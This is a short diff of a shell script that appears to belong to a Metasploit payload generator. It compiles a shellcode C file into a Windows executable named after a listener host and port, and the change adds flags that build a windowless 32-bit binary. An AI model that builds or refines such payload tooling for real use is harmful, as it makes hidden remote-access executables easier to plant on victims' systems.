@@ -88,7 +88,7 @@ if [ ! -d "$outdir" ]; then
         mkdir $outdir
 fi
 cd /root/.wine/drive_c/MinGW/bin/
-wine gcc.exe -o /root/out/final.exe /usr/share/metasploit-framework/ShellCode/final.c -lwsock32
+wine gcc.exe -m32 -mwindows -o /root/out/final.exe /usr/share/metasploit-framework/ShellCode/final.c -lwsock32
 cd /root/out/
 mv final.exe "$listenr-$lprt-$RANDOM.exe"
 filex=`ls -ct1 | head -1`
